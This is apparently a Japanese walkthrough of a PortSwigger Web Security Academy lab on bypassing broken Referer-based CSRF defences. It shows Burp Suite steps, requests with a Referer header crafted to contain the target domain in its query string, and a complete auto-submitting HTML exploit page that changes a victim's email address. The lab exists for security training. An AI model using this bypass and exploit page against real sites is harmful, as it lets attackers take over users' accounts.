# リファラー検証が壊れた CSRF

次のハッキングラボを実施します  
https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken  
このラボの電子メール変更機能は CSRF に対して脆弱です。クロスドメインリクエストを検出してブロックしようとしますが、検出メカニズムはバイパスされる可能性があります。

- 1. BurpSuite を起動して、Proxy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. 一般ユーザーでログインします
- 4. メールアドレスの更新を行います
- 5. POST /my-account/change-email HTTP/2 リクエストを send to repeater します

* 6. リファラーを書き換えて送信すると失敗します

```
POST /my-account/change-email HTTP/2
Host: 0a9500ee03463eba84c47014008000bc.web-security-academy.net
・・・
Referer: abc
```

- 7. リファラーの元の url を残した状態で改変してリクエストを送信します

```
POST /my-account/change-email HTTP/2
Host: 0a9500ee03463eba84c47014008000bc.web-security-academy.net
Cookie: session=MWLNmyIB5PE4gmaRfpSGdHbweZBjH6oj
・・・
Referer: https://arbitrary-incorrect-domain.net?0a9500ee03463eba84c47014008000bc.web-security-academy.net
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

email=test%40com

```

- 8. エクスプロイトサーバに移動します
- 9. 次の内容をボディに入力

```html
<body>
  <script>
    history.pushState("", "", "/?0a9500ee03463eba84c47014008000bc.web-security-academy.net");
  </script>
  <form method="POST" action="https://0a9500ee03463eba84c47014008000bc.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="tehhst@com" />
    <input type="hidden" name="csrf" value="N7nhxeOtRY8fCgExCDfDmM1qhfdT11j2" />
    <input type="submit" value="submit" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
```

- 10. Save ボタン押下後に deliver exploit to victim ボタン押下
